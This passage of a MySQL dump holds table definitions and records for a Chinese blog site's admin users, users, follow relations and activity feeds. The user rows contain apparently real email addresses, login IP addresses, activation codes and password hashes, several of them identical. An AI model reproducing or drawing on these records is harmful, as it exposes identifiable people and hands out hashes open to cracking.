  `avatar` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '后台用户的头像',
  `operate_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '最后一次操作的时间',
  `operate_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '最后一次操作的ip',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户创建的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '后台用户的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_user
-- ----------------------------
INSERT INTO `sys_user` VALUES (1, 1, 'qianyue', '03ECB023B6CEEBFA0187F99682D99532', 'default.jpg', '2018-08-14 12:18:04', '', '2018-08-14 12:18:04');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户主键id',
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆名称',
  `email` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆,找回密码,激活状态的邮箱',
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆密码',
  `nickname` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户昵称,第一次为用户注册时的登陆名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户个人描述',
  `website` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户的网站',
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户的头像地址',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '用户被赞数,游客也可以点击',
  `status` int(0) NOT NULL DEFAULT 0 COMMENT '用户的状态.0:正常,1:被禁封',
  `activation_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '邮件激活的密钥',
  `activation_status` int(0) NOT NULL DEFAULT 0 COMMENT '用户注册后的激活状态.0:未激活,1:激活',
  `follower_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的关注数量,通过user_follow数据表获得',
  `fans_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的粉丝数量,通过user_follow数据表获得',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的评论数量,评论后由消息队列进行更新',
  `article_sum` int(0) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户的文章数量,添加文章后更新',
  `before_login_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户上次登陆的ip',
  `now_login_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户本次登陆的ip',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户创建的时间',
  `operate_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户最后一次操作的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 20 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (1, 'author', '1246361002@qq.com', 'D9C8F551B8CD3BCB7EE27AEE12D20337', '纤月', '我好菜啊', 'tuwq.com', '11E68E08859F3D3ED8123CA35AB08B6F.jpg?v=1572255357940', 102, 0, '29637AD538A6DFA512CE8C3F20F542D5', 1, 0, 0, 7, 131, '183.218.231.36', '183.218.250.182', '2018-08-23 15:30:49', '2021-06-30 12:58:38');
INSERT INTO `user` VALUES (2, 'me', '760613041@qq.com', '75C089181060A2B88DDC9E5055325306', 'lzhpo', '', 'https://www.lzhpo.com', 'default.jpg', 0, 0, 'F0F8A223B64FB4782BACF5ECC1457E5C', 1, 0, 0, 1, 0, '125.112.3.222', '125.112.3.222', '2018-09-24 13:03:20', '2020-05-09 13:47:00');
INSERT INTO `user` VALUES (3, 'surest', '1562135624@qq.com', 'C0D2DDEB876BE61723A65ED7CA0B4E17', 'surest', '', '', 'default.jpg', 0, 0, '3EF530109D1FB4368CD1C1B6CD9A7ED1', 1, 0, 0, 0, 0, '42.3.27.229', '42.3.27.229', '2018-10-15 12:58:03', '2018-10-15 12:59:11');
INSERT INTO `user` VALUES (4, 'www', '2485573530@qq.com', '0CF79891D57C6A60FD08494FE6D4F8C1', 'www', '', '', 'default.jpg', 0, 0, '7BF2E71393EDACC14C72D258F9F11922', 1, 0, 0, 0, 0, '117.163.21.41', '117.163.21.41', '2018-11-13 09:40:09', '2020-04-06 10:16:25');
INSERT INTO `user` VALUES (5, 'bucai', '1450941858@qq.com', '244474689CEE061CCB214B8DCC7987B7', 'bucai', '', 'http://blog.ncgame.cc', 'default.jpg', 0, 0, '098FCA6B2AEB167294240175F09656C0', 1, 0, 0, 0, 0, '39.178.42.54', '39.178.42.54', '2018-11-27 10:47:34', '2019-10-20 10:50:04');
INSERT INTO `user` VALUES (6, '1', '1339521912@qq.com', '11E68E08859F3D3ED8123CA35AB08B6F', '1', '', '', 'default.jpg', 0, 0, '19D7B7D2C0FB735DE90930FBC732B872', 1, 0, 0, 0, 0, '218.65.5.211', '218.65.5.211', '2018-11-28 11:05:22', '2018-11-28 11:06:04');
INSERT INTO `user` VALUES (7, 'nihao', '465521398@qq.com', '0A88961977F8932FF54C246C92706D83', 'nihao', '', '', 'default.jpg', 0, 0, '20D06DAC6634DE1D5D9E6C12C820E938', 1, 0, 0, 0, 0, '96.9.68.121', '96.9.68.121', '2019-01-06 19:07:46', '2019-01-06 19:08:42');
INSERT INTO `user` VALUES (8, 'tuwq', 'tuwenq@gmail.com', 'D9C8F551B8CD3BCB7EE27AEE12D20337', 'tuwq', 'wop', 'webl.', '5F1D4D03C21655616324EE6C8BC2DCA7.jpg?v=1550058513458', 0, 0, '854EE670E2FD53D50A15A75095A466F8', 1, 0, 0, 2, 0, '127.0.0.1', '127.0.0.1', '2019-02-13 19:43:05', '2019-02-13 19:51:43');
INSERT INTO `user` VALUES (9, 'tom', '1339159776@qq.com', '8EBEEB3C332FA0D02B1033559B816600', 'tom', '', '', 'default.jpg', 0, 0, '5CDB034E1CEDB8E392ECAE5F46D765EC', 0, 0, 0, 0, 0, '', '49.77.166.206', '2019-04-22 11:25:57', '2019-04-22 11:25:57');
INSERT INTO `user` VALUES (10, '夏天', '18770679401@163.com', 'C604A763A63F14F88A81C7DFEC98D00F', '夏天', '', '', 'default.jpg', 0, 0, 'E467D2B31004B4EAA93871945E35A32C', 0, 0, 0, 0, 0, '', '211.95.6.66', '2019-06-04 08:49:08', '2019-06-04 08:49:08');
INSERT INTO `user` VALUES (11, 'jewdore', '1106896377@qq.com', '947BCF6ECE932A80CBF65ECB66B3C47D', 'jewdore', '', '', 'default.jpg', 0, 0, 'F9E232CFBA7DE95FD333C24593DE7269', 1, 0, 0, 1, 0, '183.195.35.173', '183.195.35.173', '2019-10-23 22:46:57', '2019-10-23 22:50:05');
INSERT INTO `user` VALUES (12, 'dd', 'admin@denua.cn', '9618C3ADA2ABC71054B7F34A379F137D', 'dd', '', '', 'default.jpg', 0, 0, '663D0E66BBB51FD7017C4CDABF13C72C', 1, 0, 0, 0, 0, '223.73.237.194', '113.116.83.251', '2019-12-01 22:30:07', '2020-07-06 11:57:01');
INSERT INTO `user` VALUES (13, 'faker', 'faker@gmail.com', 'BD95974AF149398309E7B389FCA6C247', 'faker', '', '', 'default.jpg', 0, 0, 'FE2F8870B08D82243FE0C5C64C301C0F', 0, 0, 0, 0, 0, '', '182.16.18.117', '2020-02-25 17:55:34', '2020-02-25 17:55:34');
INSERT INTO `user` VALUES (14, '1018675824@qq.com', '1018675824@qq.com', '75C089181060A2B88DDC9E5055325306', '1018675824@qq.com', '', '', 'default.jpg', 0, 0, '137263A68B39760C43DFB51DF8A5AC79', 1, 0, 0, 1, 0, '220.191.185.242', '220.191.185.242', '2020-03-11 00:02:52', '2020-03-18 12:02:25');
INSERT INTO `user` VALUES (15, 'swhn', '12345454866@qq.com', '75C089181060A2B88DDC9E5055325306', 'swhn', '', '', 'default.jpg', 0, 0, 'FD056D2A28F1488DB1FE85D680CBBF89', 0, 0, 0, 0, 0, '', '171.106.202.203', '2020-05-18 10:19:48', '2020-05-18 10:19:48');
INSERT INTO `user` VALUES (16, 'tao', '1769919778@qq.com', '75C089181060A2B88DDC9E5055325306', 'tao', '', '', 'default.jpg', 0, 0, '9B29E589B4CFD2473BA5A795E2EC04E0', 1, 0, 0, 1, 0, '115.150.247.227', '115.150.247.227', '2020-06-09 10:22:35', '2020-06-09 10:31:20');
INSERT INTO `user` VALUES (17, 'chakchen', '843506943@qq.com', '90B0CD5E37E0B91890315A34A01B1988', 'chakchen', '', '', 'default.jpg', 0, 0, 'D6A968DB96D9B90926837C3E3F36D817', 1, 0, 0, 0, 0, '223.104.170.95', '223.104.170.95', '2020-06-30 21:07:05', '2020-06-30 21:10:12');
INSERT INTO `user` VALUES (18, 'test', '1175572685@qq.com', '75C089181060A2B88DDC9E5055325306', 'test', '', '', 'default.jpg', 0, 0, '5543143102CA39D4AEAFF69BD8B0E85B', 1, 0, 0, 0, 0, '119.123.74.154', '119.123.74.154', '2020-07-11 15:36:07', '2020-07-24 22:12:44');
INSERT INTO `user` VALUES (19, 'penaun', '2281707919@qq.com', '5EC0FDFE98BD94BDDC46E3C73E2F6870', 'penaun', '', '', 'default.jpg', 0, 0, 'EF66D4D600E48F10781111C1491F53E5', 1, 0, 0, 0, 0, '119.123.69.229', '113.81.197.115', '2020-08-22 17:17:32', '2021-04-23 11:17:35');

-- ----------------------------
-- Table structure for user_follow
-- ----------------------------
DROP TABLE IF EXISTS `user_follow`;
CREATE TABLE `user_follow`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户关注关系主键id',
  `from_id` int(0) NOT NULL COMMENT '来自者的id',
  `target_id` int(0) NOT NULL COMMENT '目标的id',
  `follow_status` int(0) NOT NULL DEFAULT 0 COMMENT '关注的状态.1:关注,2:不关注',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户关注关系的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user_follow
-- ----------------------------
INSERT INTO `user_follow` VALUES (1, 1, 2, 1);
INSERT INTO `user_follow` VALUES (2, 2, 1, 1);
INSERT INTO `user_follow` VALUES (3, 5, 1, 1);
INSERT INTO `user_follow` VALUES (6, 1, 5, 1);
INSERT INTO `user_follow` VALUES (7, 1, 8, 1);
INSERT INTO `user_follow` VALUES (8, 4, 1, 1);
INSERT INTO `user_follow` VALUES (9, 16, 1, 2);

-- ----------------------------
-- Table structure for user_initiate_dynamic
-- ----------------------------
DROP TABLE IF EXISTS `user_initiate_dynamic`;
CREATE TABLE `user_initiate_dynamic`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '动态发起主键id',
  `type` int(0) NOT NULL DEFAULT 0 COMMENT '动态类型.1:评论相关,2:文章相关',
  `action` int(0) NOT NULL DEFAULT 0 COMMENT '动态动作.1:提出,2回复另一个评论',
  `type_id` int(0) NOT NULL COMMENT '动态类型的id,可能是文章或者是评论,取决于type字段',
  `initiate_user_id` int(0) NOT NULL COMMENT '动态发起者的id',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建动态的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '动态数据表.用于监视用户的动作' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for user_receive_dynamic
-- ----------------------------
DROP TABLE IF EXISTS `user_receive_dynamic`;
CREATE TABLE `user_receive_dynamic`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '动态接收主键id',
  `initiate_dynamic_id` int(0) NOT NULL COMMENT '动态发起的id',
  `receive_user_id` int(0) NOT NULL COMMENT '动态接收者的id',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建动态的时间',
  `visit` int(0) NOT NULL DEFAULT 0 COMMENT '用户是否看过这条动态,0:没看过,1:看过',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

SET FOREIGN_KEY_CHECKS = 1;
